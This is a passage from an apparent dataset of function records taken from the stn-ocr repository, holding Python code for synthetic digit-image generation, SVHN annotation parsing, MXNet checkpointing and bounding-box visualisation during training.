                (house_number_crop, bbox, median_colour) = self.get_number_crop()
        else:
            dominating_colour = median_colour
        (house_number_crop, bbox) = self.adjust_house_number_crop(house_number_crop, bbox)
        paste_bbox = self.find_paste_location(bbox, found_bboxes)
        found_bboxes.append(paste_bbox)
        images.append(house_number_crop)
    base_image = self.create_base_image(tuple(dominating_colour))
    for (image, bbox) in zip(images, found_bboxes):
        base_image_data = np.asarray(base_image, dtype=np.uint8).copy()
        image_array = np.asarray(image, dtype=np.uint8)
        image_holder = np.zeros_like(base_image_data, dtype=np.uint8)
        image_holder[bbox.top:bbox.top + bbox.height, bbox.left:bbox.left + bbox.width, :] = image_array[:]
        image = Image.fromarray(image_holder, mode='RGBA')
        base_image_data[bbox.top:bbox.top + bbox.height, bbox.left:bbox.left + bbox.width, 3] = 255 - image_array[..., 3]
        base_image = Image.fromarray(base_image_data, mode='RGBA')
        base_image = Image.alpha_composite(base_image, image)
    return (base_image, found_bboxes)"
Bartzi/stn-ocr,create_dataset,"def create_dataset(self, num_samples, destination_dir, max_label_length, pad_value=10, start=0):
    i = start
    label_file_data = []
    bbox_file_data = []
    while i < num_samples + start:
        (image, bboxes) = self.create_sample()
        image = image.convert('RGB')
        labels = [bbox.label for bbox in self.sort_bboxes(bboxes)]
        if not all((len(label) <= max_label_length for label in labels)):
            continue
        labels = [l + [pad_value] * (max_label_length - len(l)) for l in labels]
        labels_concatentated = []
        for label in labels:
            labels_concatentated.extend(label)
        labels = labels_concatentated
        image_path = os.path.join(os.path.abspath(destination_dir), '{}.png'.format(i))
        image.save(image_path)
        bbox_data = []
        for bbox in bboxes:
            bbox_data.extend([bbox.left, bbox.width, bbox.top, bbox.height])
        bbox_file_data.append([image_path] + bbox_data)
        label_file_data.append([image_path] + labels + bbox_data)
        if (i + 1) % 1000 == 0:
            print(i + 1)
        i += 1
    with open(os.path.join(os.path.dirname(destination_dir), '{}.csv'.format(os.path.basename(destination_dir))), 'w' if start == 0 else 'a') as gt_file:
        writer = csv.writer(gt_file, delimiter='\t')
        writer.writerows(label_file_data)
    with open(os.path.join(os.path.dirname(destination_dir), '{}_bboxes.csv'.format(os.path.basename(destination_dir))), 'w' if start == 0 else 'a') as gt_file:
        writer = csv.writer(gt_file, delimiter='\t')
        writer.writerows(bbox_file_data)"
Bartzi/stn-ocr,__init__,"def __init__(self, *args, **kwargs):
    self.variance = kwargs.pop('variance')
    super(GaussianSVHNCreator, self).__init__(*args, **kwargs)"
Bartzi/stn-ocr,find_paste_location,"def find_paste_location(self, bbox, already_pasted_bboxes):
    while True:
        x_derivation = random.gauss(0, self.variance) * (self.image_size // 2)
        y_derivation = random.gauss(0, self.variance) * (self.image_size // 2)
        center = Point(x=self.image_size // 2, y=self.image_size // 2)
        bbox.left = max(min(center.x + x_derivation, self.image_size), 0)
        bbox.top = max(min(center.y + y_derivation, self.image_size), 0)
        if bbox.left + bbox.width > self.image_size:
            bbox.left = self.image_size - bbox.width
        if bbox.top + bbox.height > self.image_size:
            bbox.top = self.image_size - bbox.height
        if not any((intersects(bbox, box) for box in already_pasted_bboxes)):
            return bbox"
Bartzi/stn-ocr,interpolate_width,"def interpolate_width(data):
    num_interpolation_pixels = int(data.shape[1] * fade_percentage)
    interpolation_start = data.shape[1] - num_interpolation_pixels
    for i in range(num_interpolation_pixels):
        data[:, interpolation_start + i, 3] *= (num_interpolation_pixels - i) / num_interpolation_pixels
    return data"
Bartzi/stn-ocr,interpolate_height,"def interpolate_height(data):
    num_interpolation_pixels = int(data.shape[0] * fade_percentage)
    interpolation_start = data.shape[0] - num_interpolation_pixels
    for i in range(num_interpolation_pixels):
        data[interpolation_start + i, :, 3] *= (num_interpolation_pixels - i) / num_interpolation_pixels
    return data"
Bartzi/stn-ocr,__init__,"def __init__(self, image_dir, image_size, image_columns, image_rows, destination_dir, dataset_name, max_label_length, label_pad_value=10):
    self.image_dir = image_dir
    self.image_size = image_size
    self.image_columns = image_columns
    self.images_per_sample = image_columns * image_rows
    self.destination_dir = destination_dir
    self.dataset_name = dataset_name
    self.max_label_length = max_label_length
    self.destination_image_dir = os.path.join(destination_dir, dataset_name)
    os.makedirs(self.destination_image_dir, exist_ok=True)
    self.label_pad_value = label_pad_value
    self.interpolation_area = 0.15
    self.image_rows = image_rows
    self.dest_image_size = (int(image_rows * self.image_size - (image_rows - 1) * self.image_size * self.interpolation_area), int(image_columns * self.image_size - (image_columns - 1) * self.image_size * self.interpolation_area))
    self.overlap_map = np.zeros(self.dest_image_size, dtype=np.uint32)"
Bartzi/stn-ocr,blend_at_intersection,"def blend_at_intersection(self, images):
    pre_blend_images = []
    for (idx, image) in enumerate(images):
        (x_start, y_start) = self.get_start_indices(idx)
        image_data = np.asarray(image)
        overlap_data = self.overlap_map[y_start:y_start + self.image_size, x_start:x_start + self.image_size]
        alpha_image = image_data.copy()
        alpha_image[:, :, 3] = image_data[:, :, 3] / overlap_data
        pre_blend_image = np.zeros(self.dest_image_size + (4,), dtype=np.uint8)
        pre_blend_image[y_start:y_start + self.image_size, x_start:x_start + self.image_size] = alpha_image
        pre_blend_images.append(Image.fromarray(pre_blend_image, 'RGBA'))
    dest_image = pre_blend_images[0]
    for blend_image in pre_blend_images[1:]:
        dest_image = Image.alpha_composite(dest_image, blend_image)
    return dest_image"
Bartzi/stn-ocr,interpolate_at_intersection,"def interpolate_at_intersection(self, images):

    def interpolate_width(data):
        interpolation_start = data.shape[1] - num_interpolation_pixels
        for i in range(num_interpolation_pixels):
            data[:, interpolation_start + i, 3] *= (num_interpolation_pixels - i) / num_interpolation_pixels
        return data

    def interpolate_height(data):
        interpolation_start = data.shape[0] - num_interpolation_pixels
        for i in range(num_interpolation_pixels):
            data[interpolation_start + i, :, 3] *= (num_interpolation_pixels - i) / num_interpolation_pixels
        return data
    pre_blend_images = []
    num_interpolation_pixels = int(self.image_size * self.interpolation_area)
    for y_idx in range(self.image_rows):
        for x_idx in range(self.image_columns):
            image_idx = y_idx * self.image_columns + x_idx
            image = images[image_idx]
            (x_start, y_start) = self.get_start_indices(y_idx, x_idx)
            image_data = np.asarray(image).copy().astype(np.float64)
            if x_idx < self.image_columns - 1:
                image_data = interpolate_width(image_data)
            if x_idx > 0:
                image_data = np.fliplr(image_data)
                image_data = interpolate_width(image_data)
                image_data = np.fliplr(image_data)
            if y_idx < self.image_rows - 1:
                image_data = interpolate_height(image_data)
            if y_idx > 0:
                image_data = np.flipud(image_data)
                image_data = interpolate_height(image_data)
                image_data = np.flipud(image_data)
            pre_blend_image = np.zeros(self.dest_image_size + (4,), dtype=np.uint8)
            pre_blend_image[y_start:y_start + self.image_size, x_start:x_start + self.image_size] = image_data.astype(np.uint8)
            pre_blend_images.append(Image.fromarray(pre_blend_image, 'RGBA'))
    dest_image = pre_blend_images[0]
    for blend_image in pre_blend_images[1:]:
        dest_image = Image.alpha_composite(dest_image, blend_image)
    dest_image = dest_image.convert('RGB')
    return dest_image"
Bartzi/stn-ocr,get_start_indices,"def get_start_indices(self, y_idx, x_idx):
    x_start = x_idx * self.image_size
    x_start = x_start - x_idx * self.image_size * self.interpolation_area if x_start > 0 else x_start
    y_start = y_idx * self.image_size
    y_start = y_start - y_idx * self.image_size * self.interpolation_area if y_start > 0 else y_start
    return (int(x_start), int(y_start))"
Bartzi/stn-ocr,create_sample,"def create_sample(self, image_information):
    images = []
    all_labels = []
    self.overlap_map[:] = 0
    for y_idx in range(self.image_rows):
        x_idx = 0
        while x_idx < self.image_columns:
            image_info = random.choice(image_information)
            file_name = image_info['filename']
            bboxes = image_info['boxes']
            labels = [int(box['label']) - 1 for box in bboxes]
            if len(labels) > self.max_label_length:
                continue
            all_labels.append(labels + [self.label_pad_value] * (self.max_label_length - len(labels)))
            with Image.open(os.path.join(self.image_dir, file_name)) as image:
                image = image.resize((self.image_size, self.image_size))
                image = image.convert('RGBA')
                images.append(image)
                (x_start, y_start) = self.get_start_indices(y_idx, x_idx)
                self.overlap_map[y_start:y_start + self.image_size, x_start:x_start + self.image_size] += 1
            x_idx += 1
    assert len(images) == self.images_per_sample
    return (self.interpolate_at_intersection(images), all_labels)"
Bartzi/stn-ocr,pad_labels,"def pad_labels(self, labels):
    longest_label_length = max(map(len, labels))
    padded_labels = []
    for label in labels:
        padded_label = label + [self.label_pad_value] * (longest_label_length - len(label))
        padded_labels.append(padded_label)
    return padded_labels"
Bartzi/stn-ocr,create_dataset,"def create_dataset(self, num_samples, image_infos):
    all_labels = []
    for i in range(num_samples):
        if (i + 1) % 1000 == 0:
            print(i + 1)
        (sample, labels) = self.create_sample(image_infos)
        all_labels.extend(labels)
        sample.save(os.path.join(self.destination_image_dir, '{}.png'.format(i)))
    with open(os.path.join(self.destination_dir, '{}.csv'.format(self.dataset_name)), 'w') as gt_file:
        writer = csv.writer(gt_file, delimiter='\t')
        all_labels_concatenated = []
        for idx in range(0, len(all_labels), self.images_per_sample):
            concatenated = list(itertools.chain(*all_labels[idx:idx + self.images_per_sample]))
            all_labels_concatenated.append(concatenated)
        assert len(all_labels_concatenated) == num_samples, 'number of labels should be as large as number of generated samples'
        for (idx, labels) in enumerate(all_labels_concatenated):
            writer.writerow([os.path.join(os.path.abspath(self.destination_image_dir), '{}.png'.format(idx))] + labels)"
Bartzi/stn-ocr,interpolate_width,"def interpolate_width(data):
    interpolation_start = data.shape[1] - num_interpolation_pixels
    for i in range(num_interpolation_pixels):
        data[:, interpolation_start + i, 3] *= (num_interpolation_pixels - i) / num_interpolation_pixels
    return data"
Bartzi/stn-ocr,interpolate_height,"def interpolate_height(data):
    interpolation_start = data.shape[0] - num_interpolation_pixels
    for i in range(num_interpolation_pixels):
        data[interpolation_start + i, :, 3] *= (num_interpolation_pixels - i) / num_interpolation_pixels
    return data"
Bartzi/stn-ocr,get_images,"def get_images(image_dir, images, min_width, min_height):
    for an_image in images:
        with Image.open(os.path.join(image_dir, an_image)) as image:
            (width, height) = image.size
        if width >= min_width and height >= min_height:
            yield an_image"
Bartzi/stn-ocr,__init__,"def __init__(self, inf):
    self.inf = h5py.File(inf, 'r')
    self.digitStructName = self.inf['digitStruct']['name']
    self.digitStructBbox = self.inf['digitStruct']['bbox']"
Bartzi/stn-ocr,getName,"def getName(self, n):
    return ''.join([chr(c[0]) for c in self.inf[self.digitStructName[n][0]].value])"
Bartzi/stn-ocr,bboxHelper,"def bboxHelper(self, attr):
    if len(attr) > 1:
        attr = [self.inf[attr.value[j].item()].value[0][0] for j in range(len(attr))]
    else:
        attr = [attr.value[0][0]]
    return attr"
Bartzi/stn-ocr,getBbox,"def getBbox(self, n):
    bbox = {}
    bb = self.digitStructBbox[n].item()
    bbox['height'] = self.bboxHelper(self.inf[bb]['height'])
    bbox['label'] = self.bboxHelper(self.inf[bb]['label'])
    bbox['left'] = self.bboxHelper(self.inf[bb]['left'])
    bbox['top'] = self.bboxHelper(self.inf[bb]['top'])
    bbox['width'] = self.bboxHelper(self.inf[bb]['width'])
    return bbox"
Bartzi/stn-ocr,getDigitStructure,"def getDigitStructure(self, n):
    s = self.getBbox(n)
    s['name'] = self.getName(n)
    return s"
Bartzi/stn-ocr,getAllDigitStructure,"def getAllDigitStructure(self):
    return [self.getDigitStructure(i) for i in range(len(self.digitStructName))]"
Bartzi/stn-ocr,getAllDigitStructure_ByDigit,"def getAllDigitStructure_ByDigit(self):
    pictDat = self.getAllDigitStructure()
    result = []
    structCnt = 1
    for i in range(len(pictDat)):
        item = {'filename': pictDat[i]['name']}
        figures = []
        for j in range(len(pictDat[i]['height'])):
            figure = {}
            figure['height'] = pictDat[i]['height'][j]
            figure['label'] = pictDat[i]['label'][j]
            figure['left'] = pictDat[i]['left'][j]
            figure['top'] = pictDat[i]['top'][j]
            figure['width'] = pictDat[i]['width'][j]
            figures.append(figure)
        structCnt = structCnt + 1
        item['boxes'] = figures
        result.append(item)
    return result"
Bartzi/stn-ocr,get_create_checkpoint_callback,"def get_create_checkpoint_callback(iteration, model_prefix):

    def create_checkpoint(execution_params):
        if execution_params.nbatch % iteration == 0:
            original_executor = execution_params.locals['executor_manager']
            save_dict = {'arg:%s' % k: v[0].as_in_context(mx.cpu()) for (k, v) in zip(original_executor.param_names, original_executor.param_arrays)}
            save_dict.update({'aux:%s' % k: v[0].as_in_context(mx.cpu()) for (k, v) in zip(original_executor.aux_names, original_executor.aux_arrays)})
            symbol = execution_params.locals['symbol']
            symbol.save('{}-symbol.json'.format(model_prefix))
            model_name = '{}-{:0>4}-{:0>5}'.format(model_prefix, execution_params.epoch, execution_params.nbatch)
            mx.nd.save(model_name, save_dict)
            logging.info('Saved checkpoint to ""{}""'.format(model_name))
    return create_checkpoint"
Bartzi/stn-ocr,create_checkpoint,"def create_checkpoint(execution_params):
    if execution_params.nbatch % iteration == 0:
        original_executor = execution_params.locals['executor_manager']
        save_dict = {'arg:%s' % k: v[0].as_in_context(mx.cpu()) for (k, v) in zip(original_executor.param_names, original_executor.param_arrays)}
        save_dict.update({'aux:%s' % k: v[0].as_in_context(mx.cpu()) for (k, v) in zip(original_executor.aux_names, original_executor.aux_arrays)})
        symbol = execution_params.locals['symbol']
        symbol.save('{}-symbol.json'.format(model_prefix))
        model_name = '{}-{:0>4}-{:0>5}'.format(model_prefix, execution_params.epoch, execution_params.nbatch)
        mx.nd.save(model_name, save_dict)
        logging.info('Saved checkpoint to ""{}""'.format(model_name))"
Bartzi/stn-ocr,draw_bbox,"def draw_bbox(self, bboxes, output_size, target_size, draw, colour):
    bboxes = np.squeeze(bboxes)
    bboxes = (bboxes + 1) / 2
    single_image_target_size = Size(width=target_size.width // 4, height=target_size.height)
    bboxes[:, 0] *= single_image_target_size.width
    bboxes[:, 1] *= single_image_target_size.height
    for (idx, bbox) in enumerate(np.split(bboxes, len(bboxes), axis=0)):
        bbox = np.squeeze(bbox, axis=0)
        x = np.clip(bbox[0].reshape(output_size.height, output_size.width), 0, single_image_target_size.width)
        y = np.clip(bbox[1].reshape(output_size.height, output_size.width), 0, single_image_target_size.height)
        x += idx * single_image_target_size.width
        top_left = (x[0, 0], y[0, 0])
        top_right = (x[0, -1], y[0, -1])
        bottom_left = (x[-1, 0], y[-1, 0])
        bottom_right = (x[-1, -1], y[-1, -1])
        draw.polygon([top_left, top_right, bottom_right, bottom_left], outline=colour)"
Bartzi/stn-ocr,create_image_from_array,"def create_image_from_array(self, array, resize=True):
    array = np.transpose(array, (0, 2, 3, 1, 4))
    shape = array.shape
    array = np.reshape(array, shape[:3] + (-1,))
    return super(FSNSBBOXPlotter, self).create_image_from_array(array, resize=resize)"
Bartzi/stn-ocr,majority_vote,"@staticmethod
def majority_vote(array):
    array = array.reshape(4, -1)
    votes = np.zeros(array.shape[1], dtype=np.int32)
    for (idx, result) in enumerate(np.split(array, array.shape[1], axis=1)):
        result = np.squeeze(result, axis=1)
        votes[idx] = Counter(result).most_common(1)[0][0]
    return votes"
Bartzi/stn-ocr,save_extracted_regions,"def save_extracted_regions(self, input, regions, transform_params, iteration, labels, gt_bboxes=None, extra_transform_params=None, extra_interpolated_areas=None):
    shape = regions.shape
    regions = np.reshape(regions, (shape[0] // 4, 4) + shape[1:])
    shape = transform_params.shape
    transform_params = np.reshape(transform_params, (shape[0] // 4, 4) + shape[1:])
    super(FSNSBBOXPlotter, self).save_extracted_regions(input, regions, transform_params, iteration, labels, gt_bboxes=gt_bboxes, extra_transform_params=extra_transform_params, extra_interpolated_areas=extra_interpolated_areas)"
Bartzi/stn-ocr,__init__,"def __init__(self, image_size, output_size, base_dir, **kwargs):
    self.image_size = image_size
    self.output_size = output_size
    self.base_dir = base_dir
    self.save_attention = kwargs.pop('save_attention', False)
    self.plot_extra_loc = kwargs.pop('plot_extra_loc', False)
    self.plot_individual_regions = kwargs.pop('plot_individual_regions', True)
    self.show_labels = kwargs.pop('show_labels', False)
    self.save_labels = kwargs.pop('save_labels', False)
    if self.show_labels:
        self.label_majority_vote = kwargs.pop('do_label_majority_vote', False)
        label_map = kwargs.pop('label_map')
        with open(label_map) as the_label_map:
            self.label_map = json.load(the_label_map)
            self.font = ImageFont.truetype('utils/DejaVuSans.ttf', 20)
            self.blank_label = kwargs.pop('blank_label')
    self.send_bboxes = kwargs.pop('send_bboxes', False)
    if self.send_bboxes:
        socket.setdefaulttimeout(2)
        self.upstream_ip = kwargs.pop('upstream_ip', None)
        self.upstream_port = kwargs.pop('upstream_port', 1337)
    self.bbox_dir = os.path.join(base_dir, kwargs.pop('bbox_dir', 'bboxes'))
    self.create_empty_dir(self.bbox_dir)
    if self.save_attention:
        self.attention_dir = os.path.join(base_dir, 'attention')
        self.create_empty_dir(self.attention_dir)"
Bartzi/stn-ocr,create_empty_dir,"@staticmethod
def create_empty_dir(dirname):
    os.makedirs(dirname, exist_ok=True)
    for file_name in os.listdir(dirname):
        os.remove(os.path.join(dirname, file_name))"
Bartzi/stn-ocr,normalize_image,"@staticmethod
def normalize_image(image):
    min_val = image.min()
    max_val = image.max()
    if min_val != max_val:
        image -= min_val
        image *= 1.0 / (max_val - min_val)
    else:
        image[:] = 1.0
    return image"
Bartzi/stn-ocr,draw_bbox,"def draw_bbox(self, bbox, output_size, target_size, draw, colour):
    bbox = np.squeeze(bbox)
    bbox = (bbox + 1) / 2
    bbox[0] *= target_size.width
    bbox[1] *= target_size.height
    x = np.clip(bbox[0].reshape(output_size.height, output_size.width), 0, target_size.width)
    y = np.clip(bbox[1].reshape(output_size.height, output_size.width), 0, target_size.height)
    top_left = (x[0, 0], y[0, 0])
    top_right = (x[0, -1], y[0, -1])
    bottom_left = (x[-1, 0], y[-1, 0])
    bottom_right = (x[-1, -1], y[-1, -1])
    draw.polygon([top_left, top_right, bottom_right, bottom_left], outline=colour)"
Bartzi/stn-ocr,create_image_from_array,"def create_image_from_array(self, array, resize=True):
    array = np.squeeze(array)
    shape = array.shape
    is_rgb = len(shape) == 3 and shape[0] == 3
    if len(shape) > 2 and (not is_rgb):
        best_region_index = np.argmax(np.mean(np.reshape(array, (len(array), -1)), axis=1))
        array = array[best_region_index]
    array = array * 255 if array.max() <= 1 else array
    if is_rgb:
        array = np.transpose(array, (1, 2, 0))
    image = Image.fromarray(array.astype(np.uint8), mode='RGB' if is_rgb else 'L')
    if not is_rgb:
        image = image.convert('RGB')
    if resize:
        image = image.resize(self.image_size)
    return image"
Bartzi/stn-ocr,send_image,"def send_image(self, data):
    height = data.height
    width = data.width
    data = np.asarray(data, dtype=np.uint8).tobytes()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        try:
            sock.connect((self.upstream_ip, self.upstream_port))
        except Exception as e:
            print(e)
            print('could not connect to display server, disabling image rendering')
            self.send_bboxes = False
            return
        data = {'width': width, 'height': height, 'image': base64.b64encode(data).decode('utf-8')}
        sock.send(bytes(json.dumps(data), 'utf-8'))"
Bartzi/stn-ocr,save_extracted_regions,"def save_extracted_regions(self, input, regions, transform_params, iteration, labels, gt_bboxes=None, extra_transform_params=None, extra_interpolated_areas=None):
    sampling_grids = get_sampling_grid(transform_params, self.output_size)
    if extra_transform_params is not None:
        extra_size = Size(width=self.output_size.width // 2, height=self.output_size.height // 2)
        extra_sampling_grids = get_sampling_grid(extra_transform_params, extra_size)
    else:
        extra_sampling_grids = np.zeros_like(sampling_grids)
        extra_interpolated_areas = np.zeros_like(sampling_grids)
    if self.plot_individual_regions or iteration % 1000 == 0:
        dest_image_size = ((len(regions) + 1) * self.image_size.width, self.image_size.height if not self.plot_extra_loc else 2 * self.image_size.height)
    else:
        dest_image_size = (self.image_size.width, self.image_size.height)
    dest_image = Image.new('RGB', dest_image_size)
    image = self.create_image_from_array(input, resize=False)
    draw = ImageDraw.Draw(image)
    data_iter = zip(np.split(regions, len(regions)), np.split(sampling_grids, len(sampling_grids)), np.split(extra_sampling_grids, len(extra_sampling_grids)), np.split(extra_interpolated_areas, len(extra_interpolated_areas)), COLOR_MAP)
    for (idx, (region, bbox, extra_bbox, extra_region, colour)) in enumerate(data_iter, start=1):
        if self.plot_individual_regions or iteration % 1000 == 0:
            region_image = self.create_image_from_array(region)
            if self.plot_extra_loc:
                region_draw = ImageDraw.Draw(region_image)
                self.draw_bbox(extra_bbox, extra_size, self.image_size, region_draw, colour)
                extra_region_image = self.create_image_from_array(extra_region)
                dest_image.paste(extra_region_image, (idx * self.image_size.width, self.image_size.height))
            dest_image.paste(region_image, (idx * self.image_size.width, 0))
        self.draw_bbox(bbox, self.output_size, self.image_size, draw, colour)
    if gt_bboxes is not None:
        for (gt_bbox, colour) in zip(np.split(gt_bboxes, len(gt_bboxes)), reversed(COLOR_MAP)):
            gt_bbox = np.squeeze(gt_bbox, axis=0)
            top_left = (gt_bbox[0], gt_bbox[2])
            top_right = (gt_bbox[0] + gt_bbox[1], gt_bbox[2])
            bottom_left = (gt_bbox[0], gt_bbox[2] + gt_bbox[3])
            bottom_right = (gt_bbox[0] + gt_bbox[1], gt_bbox[2] + gt_bbox[3])
            draw.polygon([top_left, top_right, bottom_right, bottom_left], outline=colour)
    if self.show_labels:
        (text_width, text_height) = draw.textsize(labels, font=self.font)
        draw = ImageDraw.Draw(dest_image)
        draw.text((dest_image.width - text_width - 1, 0), labels, fill='green', font=self.font)
    dest_image.paste(image, (0, 0))
    if self.save_labels:
        file_name = '{}_{}.png'.format(os.path.join(self.bbox_dir, str(iteration)), labels)
    else:
        file_name = '{}.png'.format(os.path.join(self.bbox_dir, str(iteration)))
    dest_image.save(file_name)
    if self.send_bboxes:
        self.send_image(dest_image)"
Bartzi/stn-ocr,copy_params,"@staticmethod
def copy_params(params, original_executor, attr_name='param'):
    for param_name in params.keys():
        if param_name == 'data' or param_name == 'softmax_label':
            continue
        if param_name.endswith('state') or param_name.endswith('state_cell'):
            continue
        try:
            param_index = getattr(original_executor, '{}_names'.format(attr_name)).index(param_name)
            param_data = getattr(original_executor, '{}_arrays'.format(attr_name))[param_index]
            params[param_name][:] = param_data[0]
        except ValueError:
            continue
    return params"
Bartzi/stn-ocr,get_area_data,"def get_area_data(self, batch_size, transform_params, interpolated_areas):
    (size, num_params) = transform_params.shape
    transform_params = transform_params.reshape((size // batch_size, batch_size, num_params))
    transform_params = mx.nd.transpose(transform_params, axes=(1, 0, 2))[0]
    (size, num_channels, height, width) = interpolated_areas.shape
    interpolated_areas = interpolated_areas.reshape((size // batch_size, batch_size, num_channels, height, width))
    interpolated_areas = mx.nd.transpose(interpolated_areas, axes=(1, 0, 2, 3, 4))[0]
    return (transform_params, interpolated_areas)"
Bartzi/stn-ocr,majority_vote,"@staticmethod
def majority_vote(array):
    raise NotImplementedError('This class can not handle data that might need majority voting on labels')"
Bartzi/stn-ocr,get_callback,"def get_callback(self, stn_output, data, label, num_data=1, batch_num=None, show_gt_bboxes=False):
    """"""
            function that creates an image showing the current state of the network when it comes to predicting
            the locations of the ROIs, found by the spatial transformer. In order to do this this callback performs a forward
            pass through the network at its current state. This callback saves one image for each call.
        :param stn_output: symbol that is the grouped output of the localization net and the spatial transformer
        :param data: np array of input data in the format as it is expected by the network (i.e. shape=(batch_size, channels, height, width))
        :param label:
        :param dest_dir: destination directory where the resulting bbox plots shall be saved.
        :return: a callback function
        """"""

    def plot_bboxes(execution_params):
        data_iter = execution_params.locals['train_data']
        iters_per_epoch = num_data // data_iter.batch_size
        batch_size = data_iter.batch_size if batch_num is None else batch_num
        input_data_shapes = {description.name: (batch_size,) + description.shape[1:] for description in data_iter.provide_data}
        for label_data in data_iter.provide_label:
            input_data_shapes[label_data.name] = (batch_size,) + label_data.shape[1:]
        executor = stn_output.simple_bind(execution_params.locals['ctx'][0], grad_req='null', **input_data_shapes)
        original_executor = execution_params.locals['executor_manager']
        params = executor.arg_dict
        self.copy_params(params, original_executor, attr_name='param')
        aux_params = executor.aux_dict
        self.copy_params(aux_params, original_executor, attr_name='aux')
        params['data'][:] = mx.nd.array(np.tile(data, (batch_size, 1, 1, 1)))
        params['softmax_label'] = mx.nd.array(label)
        executor.forward(is_train=False)
        (transform_params, interpolated_areas) = self.get_area_data(batch_size, executor.outputs[0], executor.outputs[1])
        if self.show_labels:
            if self.label_majority_vote:
                labels = self.majority_vote(np.argmax(executor.outputs[2].asnumpy(), axis=1))
                labels = strip_prediction(labels, self.blank_label)
            else:
                labels = strip_prediction(np.argmax(executor.outputs[2].asnumpy(), axis=1), self.blank_label)
            labels = ''.join([chr(self.label_map[str(x)]) for x in labels])
        else:
            labels = ''
        extra_transform_params = None
        extra_interpolated_areas = None
        if self.plot_extra_loc:
            extra_transform_params = executor.outputs[3]
            (size, num_params) = extra_transform_params.shape
            extra_transform_params = extra_transform_params.reshape((size // batch_size, batch_size, num_params))
            extra_transform_params = mx.nd.transpose(extra_transform_params, axes=(1, 0, 2))[0]
            extra_interpolated_areas = executor.outputs[4]
            (size, num_channels, height, width) = extra_interpolated_areas.shape
            extra_interpolated_areas = extra_interpolated_areas.reshape((size // batch_size, batch_size, num_channels, height, width))
            extra_interpolated_areas = mx.nd.transpose(extra_interpolated_areas, axes=(1, 0, 2, 3, 4))[0]
        gt_bboxes = None
        if show_gt_bboxes:
            num_timesteps = size // batch_size
            (_, gt_bboxes) = np.split(label, [-(num_timesteps * 4)])
            gt_bboxes = gt_bboxes.reshape(num_timesteps, 4)
        iteration = execution_params.epoch * iters_per_epoch + execution_params.nbatch
        self.save_extracted_regions(data, interpolated_areas.asnumpy(), transform_params.asnumpy(), iteration, labels, gt_bboxes=gt_bboxes, extra_transform_params=extra_transform_params.asnumpy() if extra_transform_params is not None else None, extra_interpolated_areas=extra_interpolated_areas.asnumpy() if extra_interpolated_areas is not None else None)
    return plot_bboxes"
Bartzi/stn-ocr,plot_bboxes,"def plot_bboxes(execution_params):
    data_iter = execution_params.locals['train_data']
    iters_per_epoch = num_data // data_iter.batch_size
    batch_size = data_iter.batch_size if batch_num is None else batch_num
    input_data_shapes = {description.name: (batch_size,) + description.shape[1:] for description in data_iter.provide_data}
    for label_data in data_iter.provide_label:
        input_data_shapes[label_data.name] = (batch_size,) + label_data.shape[1:]
    executor = stn_output.simple_bind(execution_params.locals['ctx'][0], grad_req='null', **input_data_shapes)
    original_executor = execution_params.locals['executor_manager']
    params = executor.arg_dict
    self.copy_params(params, original_executor, attr_name='param')
    aux_params = executor.aux_dict
    self.copy_params(aux_params, original_executor, attr_name='aux')
    params['data'][:] = mx.nd.array(np.tile(data, (batch_size, 1, 1, 1)))
    params['softmax_label'] = mx.nd.array(label)
    executor.forward(is_train=False)
    (transform_params, interpolated_areas) = self.get_area_data(batch_size, executor.outputs[0], executor.outputs[1])
    if self.show_labels:
        if self.label_majority_vote:
            labels = self.majority_vote(np.argmax(executor.outputs[2].asnumpy(), axis=1))
            labels = strip_prediction(labels, self.blank_label)
        else:
            labels = strip_prediction(np.argmax(executor.outputs[2].asnumpy(), axis=1), self.blank_label)
        labels = ''.join([chr(self.label_map[str(x)]) for x in labels])
    else:
        labels = ''
    extra_transform_params = None
    extra_interpolated_areas = None
    if self.plot_extra_loc:
        extra_transform_params = executor.outputs[3]
        (size, num_params) = extra_transform_params.shape
        extra_transform_params = extra_transform_params.reshape((size // batch_size, batch_size, num_params))
        extra_transform_params = mx.nd.transpose(extra_transform_params, axes=(1, 0, 2))[0]
        extra_interpolated_areas = executor.outputs[4]
        (size, num_channels, height, width) = extra_interpolated_areas.shape
        extra_interpolated_areas = extra_interpolated_areas.reshape((size // batch_size, batch_size, num_channels, height, width))
        extra_interpolated_areas = mx.nd.transpose(extra_interpolated_areas, axes=(1, 0, 2, 3, 4))[0]
    gt_bboxes = None
    if show_gt_bboxes:
        num_timesteps = size // batch_size
        (_, gt_bboxes) = np.split(label, [-(num_timesteps * 4)])
        gt_bboxes = gt_bboxes.reshape(num_timesteps, 4)
    iteration = execution_params.epoch * iters_per_epoch + execution_params.nbatch
    self.save_extracted_regions(data, interpolated_areas.asnumpy(), transform_params.asnumpy(), iteration, labels, gt_bboxes=gt_bboxes, extra_transform_params=extra_transform_params.asnumpy() if extra_transform_params is not None else None, extra_interpolated_areas=extra_interpolated_areas.asnumpy() if extra_interpolated_areas is not None else None)"
Bartzi/stn-ocr,_load_image,"def _load_image(file_name, base_dir, target_size=None, image_mode='L'):
    with Image.open(os.path.join(base_dir, file_name)) as the_image:
        the_image = the_image.convert(image_mode)
        if target_size is not None:
            the_image = the_image.resize((target_size.width, target_size.height), Image.ANTIALIAS)
        image = np.asarray(the_image, dtype=np.float32)
        image /= 255
        if image_mode != 'L':
            return image.transpose(2, 0, 1)
        else:
            return image[np.newaxis, ...]"
Bartzi/stn-ocr,_load_worker,"def _load_worker(input_queue, output_queue, base_dir, target_size, delimiter, expected_label_length, image_mode):
    while True:
        line = input_queue.get()
        if line is None:
            break
        line = line.split(delimiter)
        file_name = line[0]
        labels = np.array(line[1:], dtype=np.int32)
        image = None
        try:
            success = True
            image = _load_image(file_name, base_dir, target_size, image_mode=image_mode)[np.newaxis, ...]
            if len(labels) != expected_label_length:
                success = False
            else:
                labels = labels[np.newaxis, ...]
        except Exception:
            success = False
        output_queue.put((success, image, labels))"
Bartzi/stn-ocr,__init__,"def __init__(self, dataset_file, batch_size, expected_label_length, label_name='softmax_label', resize_to=None, base_dir=None, delimiter=',', num_workers=4, image_mode='L'):
    super(FileBasedIter, self).__init__()
    self.base_dir = os.path.dirname(dataset_file) if base_dir is None else base_dir
    self.resize_to = resize_to
    self.num_workers = num_workers
    self.lines = []
    if image_mode not in ['L', 'RGB']:
        raise ValueError(""Please use only 'L' (black and white) or 'RGB' as color mode specifiers"")
    with open(dataset_file, 'r') as f:
        self.lines = [l for l in f]
    self.indices = np.random.permutation(len(self.lines))
    self.batch_size = batch_size
    self.overflowed = False
    self.label_name = label_name
